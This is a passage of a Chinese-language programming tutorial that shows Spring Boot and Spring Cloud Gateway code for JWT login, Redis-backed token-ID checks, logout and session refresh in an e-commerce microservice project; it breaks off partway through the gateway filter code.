<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--redis--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后修改<code>ly-auth-service</code>的application.yml中添加redis地址：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">auth-service</span></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">host:</span> <span class="string">ly-redis</span></span><br></pre></td></tr></table></figure>



<p>修改<code>ly-auth-service</code>中<code>com.leyou.auth.service.impl</code>包下的<code>UserAuthServiceImpl</code>的<code>login</code>方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties prop, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.prop = prop;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.查询用户</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// 捕获feign的异常，并获取feign调用的状态码和异常信息</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.判断查询结果</span></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 查询失败，一定是用户名或密码错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.生成token</span></span><br><span class="line">        <span class="comment">// 3.1.tokenID</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">jti</span> <span class="operator">=</span> JwtUtils.createJTI();</span><br><span class="line">        <span class="comment">// 3.2.生成token</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateTokenWithJTI(<span class="keyword">new</span> <span class="title class_">UserInfo</span>(user.getId(), user.getUsername()), jti, prop.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.记录在redis，并设置过期时间</span></span><br><span class="line">        redisTemplate.opsForValue().set(</span><br><span class="line">                RedisConstants.JTI_KEY_PREFIX + user.getId(), jti, RedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5.写入cookie</span></span><br><span class="line">        CookieUtils.builder(response)</span><br><span class="line">                .httpOnly(<span class="literal">true</span>) <span class="comment">// 限制cookie不能用JS来获取，避免XSS攻击</span></span><br><span class="line">                .domain(UserTokenConstants.DOMAIN) <span class="comment">// cookie的域名</span></span><br><span class="line">                .build(UserTokenConstants.COOKIE_NAME, token);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="修改首页登录判断逻辑"><a href="#修改首页登录判断逻辑" class="headerlink" title="修改首页登录判断逻辑"></a>修改首页登录判断逻辑</h4><p>首页的登录状态判断，需要请求到服务端的verify方法，我们需要修改该方法，在原有判断逻辑基础上，添加对redis中的JTI的判断。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022688.png" alt="image-20200323000701286"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.读取cookie</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="comment">// 2.获取token信息</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 抛出异常，证明token无效，直接返回401</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;登录失效&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="comment">// 3.验证tokenId</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">    <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">    <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">        <span class="comment">// token的id不符合，证明token无效，直接返回401</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">401</span>, <span class="string">&quot;登录失效&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.返回用户</span></span><br><span class="line">    <span class="keyword">return</span> userInfo.getUsername();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="修改网关校验逻辑"><a href="#修改网关校验逻辑" class="headerlink" title="修改网关校验逻辑"></a>修改网关校验逻辑</h4><p>网关校验登录除了检验token，还要看redis中是否存在：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022689.png" alt="image-20200325152118464"></p>
<p>修改<code>ly-gateway</code>拦截器业务，<code>LoginFilter</code>的run方法，添加对redis的JTI判断：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022690.png" alt="image-20200322234903860"></p>
<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.RedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.ExpiredJwtException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.security.SignatureException;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取Request对象</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.获取cookie中的token</span></span><br><span class="line">        MultiValueMap&lt;String, HttpCookie&gt; cookies = request.getCookies();</span><br><span class="line">        List&lt;HttpCookie&gt; cookieList = cookies.get(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(cookieList)) &#123;</span><br><span class="line">                <span class="comment">// 没有token，拦截请求</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;未登录！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookieList.get(<span class="number">0</span>).getValue();</span><br><span class="line">            <span class="comment">// 3.通过JWT对token进行解析</span></span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line">            <span class="comment">// 3.1.获取用户信息</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="comment">// 3.2.获取redis中的JTI</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">            <span class="comment">// 3.3.比较当前token的jti和redis中的JTI</span></span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">                <span class="comment">// 无效的token，返回400</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;未登录或者登录已经过期&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// TODO 权限判断</span></span><br><span class="line">            log.info(<span class="string">&quot;用户&#123;&#125;正在访问资源：&#123;&#125;&quot;</span>, userInfo.getUsername(), request.getPath());</span><br><span class="line">            <span class="comment">// 放行</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException | SignatureException e) &#123;</span><br><span class="line">            <span class="comment">// 没有登录，判断当前请求是否是白名单请求</span></span><br><span class="line">            <span class="keyword">if</span> (isAllowRequest(request)) &#123;</span><br><span class="line">                <span class="comment">// 如果是，放行</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line">            log.error(<span class="string">&quot;用户非法访问资源：&#123;&#125;&quot;</span>, request.getPath());</span><br><span class="line">            <span class="comment">//  - 解析不通过，返回401</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;服务解析用户信息失败&quot;</span>, e);</span><br><span class="line">            <span class="comment">// 内部异常，返回500</span></span><br><span class="line">            exchange.getResponse().setStatusCode(HttpStatus.INTERNAL_SERVER_ERROR);</span><br><span class="line">            <span class="keyword">return</span> exchange.getResponse().setComplete();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getOrder</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 最高优先级</span></span><br><span class="line">        <span class="keyword">return</span> Ordered.HIGHEST_PRECEDENCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 判断一个请求是否是白名单中的请求</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request 请求对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> true：是白名单请求； false：不是白名单请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">isAllowRequest</span><span class="params">(ServerHttpRequest request)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取当前请求的path和method</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> request.getPath().toString();</span><br><span class="line">        <span class="type">String</span> <span class="variable">method</span> <span class="operator">=</span> request.getMethodValue();</span><br><span class="line">        <span class="comment">// 2.遍历白名单</span></span><br><span class="line">        Map&lt;String, Set&lt;String&gt;&gt; allowRequests = filterProp.getAllowRequests();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, Set&lt;String&gt;&gt; entry : allowRequests.entrySet()) &#123;</span><br><span class="line">            <span class="comment">// 3.获取允许的path和允许的methods</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">allowPathPrefix</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            Set&lt;String&gt; allowMethods = entry.getValue();</span><br><span class="line">            <span class="comment">// 4.判断是否允许</span></span><br><span class="line">            <span class="keyword">if</span> (StringUtils.startsWith(path, allowPathPrefix) &amp;&amp; allowMethods.contains(method)) &#123;</span><br><span class="line">                <span class="comment">// 是许可的路径，返回true</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不是白名单请求，返回false</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="退出登录-1"><a href="#退出登录-1" class="headerlink" title="退出登录"></a>退出登录</h4><p>退出登录的思路：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022691.png" alt="image-20200325151940333"></p>
<p>流程：</p>
<ul>
<li>用户发请求到服务端，携带cookie</li>
<li>服务端接收请求，获取cookie</li>
<li>校验cookie中的token的有效性，并获取cookie中的token</li>
<li>如果有效，删除cookie（重新写一个cookie，maxAge为0）</li>
<li>删除redis中的JTI</li>
</ul>
<p>退出登录的请求信息：</p>
<ul>
<li>请求方式：POST</li>
<li>请求路径：&#x2F;user&#x2F;logout</li>
<li>请求参数：无，携带cookie</li>
<li>返回值：无</li>
</ul>
<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.web</code>包的<code>UserAuthController</code>中，添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 退出登录</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> request 请求参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> response 响应数据，写cookie用</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 无</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="meta">@PostMapping(&quot;logout&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>&#123;</span><br><span class="line">    userAuthService.logout(request, response);</span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service</code>包的<code>UserAuthService</code>中，添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span>;</span><br></pre></td></tr></table></figure>

<p>在<code>ly-auth-service</code>的<code>com.leyou.auth.service.impl</code>包的<code>UserAuthServiceImpl</code>中，添加方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logout</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.获取用户cookie</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="comment">// 2.校验cookie中的token的有效性</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="comment">// 3.如果无效，什么都不做</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4.如果有效，删除cookie（重新写一个cookie，maxAge为0）</span></span><br><span class="line">    CookieUtils.deleteCookie(UserTokenConstants.COOKIE_NAME, UserTokenConstants.DOMAIN, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5.删除redis中的JTI</span></span><br><span class="line">    <span class="comment">// 5.1.获取用户信息</span></span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="comment">// 5.2.删除redis数据</span></span><br><span class="line">    redisTemplate.delete(RedisConstants.JTI_KEY_PREFIX + userInfo.getId());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h3 id="登录状态刷新"><a href="#登录状态刷新" class="headerlink" title="登录状态刷新"></a>登录状态刷新</h3><h4 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h4><p>我们签发给用户的token是永久有效的，但是Redis的标示只存活30分钟。</p>
<p>当用户登录后，浏览网页时，很快30分钟就会过去，登录失效。用户付款时提示说您尚未登录，这样用户体验会很差。</p>
<p>我们需要做到：</p>
<ul>
<li>只要用户一直访问，则登录状态一直存在，Redis不会过期</li>
<li>用户超过30分钟不访问，则登录状态失效</li>
</ul>
<p>如何实现？</p>
<p>显然，需要在用户每次访问我们的微服务时，都去刷新Redis的缓存即可。</p>
<p>而用户的一切请求都会经过网关Zuul的<code>LoginFilter</code>过滤器，因此我们需要在网关的<code>LoginFilter</code>中加入刷新Redis的超时时间业务。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022692.png" alt="image-20200325152242814"></p>
<h3 id="2-2-2-代码实现"><a href="#2-2-2-代码实现" class="headerlink" title="2.2.2.代码实现"></a>2.2.2.代码实现</h3><p>修改<code>ly-gateway</code>的<code>com.leyou.gateway.filter</code>中的<code>LoginUserFilter</code>中的filter方法，添加刷新token有效时间的逻辑：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022693.png" alt="image-20200323001117074"></p>
<p>完整代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.gateway.filters;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.RedisConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.Payload;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.FilterProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.gateway.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.ExpiredJwtException;</span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.security.SignatureException;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang3.StringUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GatewayFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.gateway.filter.GlobalFilter;</span><br><span class="line"><span class="keyword">import</span> org.springframework.core.Ordered;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.redis.core.StringRedisTemplate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpCookie;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.HttpStatus;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.server.reactive.ServerHttpRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.CollectionUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.util.MultiValueMap;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.server.ServerWebExchange;</span><br><span class="line"><span class="keyword">import</span> reactor.core.publisher.Mono;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> 虎哥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LoginFilter</span> <span class="keyword">implements</span> <span class="title class_">GlobalFilter</span>, Ordered &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties jwtProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> FilterProperties filterProp;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> StringRedisTemplate redisTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">LoginFilter</span><span class="params">(JwtProperties jwtProp, FilterProperties filterProp, StringRedisTemplate redisTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.jwtProp = jwtProp;</span><br><span class="line">        <span class="built_in">this</span>.filterProp = filterProp;</span><br><span class="line">        <span class="built_in">this</span>.redisTemplate = redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Mono&lt;Void&gt; <span class="title function_">filter</span><span class="params">(ServerWebExchange exchange, GatewayFilterChain chain)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.获取Request对象</span></span><br><span class="line">        <span class="type">ServerHttpRequest</span> <span class="variable">request</span> <span class="operator">=</span> exchange.getRequest();</span><br><span class="line">        <span class="comment">// 2.获取cookie中的token</span></span><br><span class="line">        MultiValueMap&lt;String, HttpCookie&gt; cookies = request.getCookies();</span><br><span class="line">        List&lt;HttpCookie&gt; cookieList = cookies.get(UserTokenConstants.COOKIE_NAME);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(cookieList)) &#123;</span><br><span class="line">                <span class="comment">// 没有token，拦截请求</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;未登录！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> cookieList.get(<span class="number">0</span>).getValue();</span><br><span class="line">            <span class="comment">// 3.通过JWT对token进行解析</span></span><br><span class="line">            Payload&lt;UserInfo&gt; payload = JwtUtils.getInfoFromToken(token, jwtProp.getPublicKey(), UserInfo.class);</span><br><span class="line">            <span class="comment">// 3.1.获取用户信息</span></span><br><span class="line">            <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">            <span class="comment">// 3.2.获取redis中的JTI</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> RedisConstants.JTI_KEY_PREFIX + userInfo.getId();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cacheJTI</span> <span class="operator">=</span> redisTemplate.opsForValue().get(key);</span><br><span class="line">            <span class="comment">// 3.3.比较当前token的jti和redis中的JTI</span></span><br><span class="line">            <span class="keyword">if</span> (!StringUtils.equals(cacheJTI, payload.getId())) &#123;</span><br><span class="line">                <span class="comment">// 无效的token，返回400</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SignatureException</span>(<span class="string">&quot;未登录或者登录已经过期&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 4.刷新token有效期</span></span><br><span class="line">            redisTemplate.expire(key, RedisConstants.TOKEN_EXPIRE_MINUTES, TimeUnit.MINUTES);</span><br><span class="line">            <span class="comment">// TODO 权限判断</span></span><br><span class="line">            log.info(<span class="string">&quot;用户&#123;&#125;正在访问资源：&#123;&#125;&quot;</span>, userInfo.getUsername(), request.getPath());</span><br><span class="line">            <span class="comment">// 放行</span></span><br><span class="line">            <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ExpiredJwtException | SignatureException e) &#123;</span><br><span class="line">            <span class="comment">// 没有登录，判断当前请求是否是白名单请求</span></span><br><span class="line">            <span class="keyword">if</span> (isAllowRequest(request)) &#123;</span><br><span class="line">                <span class="comment">// 如果是，放行</span></span><br><span class="line">                <span class="keyword">return</span> chain.filter(exchange);</span><br><span class="line">            &#125;</span><br><span class="line">            